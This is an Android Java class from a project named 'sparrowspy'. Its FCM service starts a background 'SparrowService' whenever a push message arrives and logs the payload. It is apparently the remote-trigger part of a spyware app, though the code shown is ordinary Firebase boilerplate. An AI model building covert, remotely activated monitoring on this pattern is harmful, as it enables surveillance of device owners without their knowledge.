package com.tangledbytes.sparrowspy.services;

import android.content.Intent;
import android.os.Build;
import android.util.Log;

import androidx.annotation.NonNull;

import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;
import com.tangledbytes.sparrowspy.services.sparrowservice.SparrowService;

public class FCMService extends FirebaseMessagingService {
    private static final String TAG = "FCMService";
    public FCMService() {
    }

    @Override
    public void onNewToken(@NonNull String token) {
        super.onNewToken(token);
        // Token is refreshed every time user re-installs or clears data of app
        // This token is used to target specific devices for FCM messages
        Log.d(TAG, "Refreshed token: " + token);
        sendRegistrationToServer(token);
    }

    private void sendRegistrationToServer(String token) {
        // TODO: Implement this method
    }

    @Override
    public void onMessageReceived(@NonNull RemoteMessage message) {
        super.onMessageReceived(message);
        Log.i(TAG, "FCM Message Received");
        if(!SparrowService.isRunning()) {
            // TODO: Test if it is actually able to start foreground service
            // FIXME: Check for permissions before starting up service
            Intent intent = new Intent(this, SparrowService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(intent);
            } else {
                startService(intent);
            }
            Log.i(TAG, "onMessageReceived: SparrowService was not running, started");
        }
        Log.i(TAG, "onMessageReceived: SparrowService already running running");
        Log.d(TAG, "Message data payload: " + message.getData());
    }
}